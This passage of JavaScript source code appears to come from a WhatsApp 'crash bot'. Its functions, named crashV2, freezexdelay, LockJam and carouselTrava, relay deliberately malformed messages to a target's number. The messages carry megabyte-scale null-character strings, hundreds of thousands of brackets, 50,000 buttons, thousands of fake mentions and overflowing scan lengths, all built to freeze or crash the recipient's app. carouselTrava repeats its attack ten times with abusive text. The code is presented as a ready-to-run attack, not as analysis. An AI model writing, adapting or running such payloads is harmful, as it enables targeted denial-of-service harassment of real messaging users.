    });
    const msg2 = {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: { text: "KoaxTzy", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u400b".repeat(1045000),
              version: 3
            },
            contextInfo: { conversionPointSource: "call_permission_request" }
          }
        }
      }
    };
    await sock.relayMessage("status@broadcast", msg2, {
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }
          ]
        }
      ]
    });
  }
}

async function crashV2(sock, target) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
              fileLength: "93217",
              caption: "7eppsynC",
              height: 1080,
              width: 1080,
              mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
              fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
              directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1778142659",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIQERIxISIyQWL/2gAIAQMBAT8AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
              contextInfo: {
                pairedMediaType: "NOT_PAIRED_MEDIA",
                isQuestion: true,
                isGroupStatus: true
              },
              scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
              scanLengths: [
                9999999999999999999,
                9999999999999999999,
                9999999999999999999,
                9999999999999999999
              ],
              midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
            },
            title: "sigmaren",
            hasMediaAttachment: true
          },
          body: {
            text: "\0"
          },
          nativeFlowMessage: {
            buttons: "[".repeat(500000)
          }
        }
      }
    }
  };
  await sock.relayMessage(target, msg, {
    participant: { jid: target }
  })
}

async function freezexdelay(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: { text: "Farras Stay Humble", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"rtr","city":"jkt","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 8640000
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target } });

  const msg2 = {
    groupStatusMessageV2: {
      message: {
        imageMessage: {
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIRAxIxIhMiQUL/2gAIAQMBAT8AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
          caption: " ⿻ ꦾꦾꦾꦾ" + "X".repeat(50000),
          contextInfo: {
            pairedMediaType: "NOT_PAIRED_MEDIA",
            isQuestion: true,
            isGroupStatus: true,
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
            ]
          },
          scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
          scanLengths: [9999999999999999999, 9999999999999999999, 9999999999999999999, 9999999999999999999],
          midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
        },
        title: "g",
        hasMediaAttachment: true,
        body: { text: "\0" },
        nativeFlowMessage: {
          quotedMessage: {
            buttonsMessage: {
              title: "🎭⃟༑⌁⃰𝐅𝐥͢𝐨ͯ𝐨ͦ͢𝐝𝐬ͮཀ͜͡🐉",
              buttons: Array.from({ length: 50000 }, () => ({
                buttonId: "xcrash_id",
                buttonText: { displayText: "ꦾꦾꦾ" + "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉".repeat(5000) }
              }))
            }
          }
        }
      }
    }
  };
  await sock.relayMessage(target, msg2, { participant: { jid: target } });
}

async function LockJam(sock, target) {
    await sock.relayMessage("status@broadcast", {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "X"
                    },
                    nativeFlowMessage: {
                        name: "address_message",
                        paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"k\",\"landmark_area\":\"k\",\"address\":\"k\",\"tower_number\":\"k\",\"city\":\"Japanese\",\"name\":\"k\",\"phone_number\":\"555555\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"k | ${"\u0000".repeat(900000)}\"}}`,
                        version: 3,
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from(
                                    { length: 9000 },
                                    () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                )
                            ]
                        }
                    }
                }
            }
        }
    }, {
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{
                        tag: "to",
                        attrs: { jid: target }
                    }]
                }]
            }
        ]
    });
}

async function carouselTrava(sock, target) {
   for (let i = 0; i < 10; i++) {
      const totalCards = 10;
      const cardList = [];

      let payloadText;
      let cardAmount;
      let travaNickName;

      if (target) {
         payloadText = "\u0000".repeat(10000);
         cardAmount = 90;
         travaNickName = "FUCK YOUR WHATSAPP 🖕";
      } else {
         payloadText = "[".repeat(10000);
         cardAmount = 90;
         travaNickName = "YOU IDIOT 😡";
      }

      for (let index = 0; index < cardAmount; index++) {
         cardList.push({
            body: {
               text: "[ # ] RXHL OFFICIAL ¿?"
            },

            footer: {
               text: ""
            },

            header: {
               title: "[ # ] RXHL OFFICIAL ¿?",
               hasMediaAttachment: true,

               imageMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                  mimetype: "image/jpeg",
                  fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                  fileLength: 999999999,
                  height: 9999,
                  width: 9999,
                  mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                  fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                  directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1776937541",
                  jpegThumbnail: null,
                  caption: "Rxhl Official ¿?",
                  scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",

                  scanLengths: [
                     9999999999999999999,
                     9999999999999999999,
                     9999999999999999999,
                     9999999999999999999
                  ],

                  midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
               }
            },

            nativeFlowMessage: {
               messageParamsJson: payloadText
            }
         });
      }

      const carouselMessage = generateWAMessageFromContent(
         target,
         {
            interactiveMessage: {
               header: {
                  hasMediaAttachment: false
               },

               body: {
                  text: travaNickName
               },

               carouselMessage: {
                  cards: [...cardList]
               }
            }
         },
         {
            userJid: target
         }
      );

      await conn.relayMessage(target, {  
         groupStatusMessageV2: { message: carouselMessage.message }  
      }, { messageId: carouselMessage.key.id, participant: { jid: target } });  
      
      await sleep(1000)
      
   }
};

// END Dek
bot.launch()
